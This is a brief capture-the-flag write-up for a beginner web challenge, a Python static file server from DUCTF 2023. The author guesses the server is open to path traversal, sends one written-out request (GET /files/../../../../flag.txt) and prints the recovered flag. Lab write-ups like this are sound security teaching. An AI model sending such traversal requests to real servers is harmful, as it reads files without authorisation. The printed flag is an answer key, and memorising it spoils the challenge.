# static file server (beginner)
Here's a simple Python app that lets you view some files on the server.

Author: joseph

https://web-static-file-server-9af22c2b5640.2023.ductf.dev

## Files
static-file-server.zip

## Solution
The website shows the following:
[File Server](images/static_file_server.png)

Opening the file _not the flag_ shows the following content:
```
The real flag is at /flag.txt
```

So we assume at this point, that the server vulnerable to path traversal.

The current file has the path loads up with the request: 
```
GET /files/not_the_flag.txt HTTP/2
```

To traverse now we can try the following request:
```
GET /files/../../../../flag.txt HTTP/2
```

Our assumption was correct and we get back the flag: `DUCTF{../../../p4th/tr4v3rsal/as/a/s3rv1c3}`
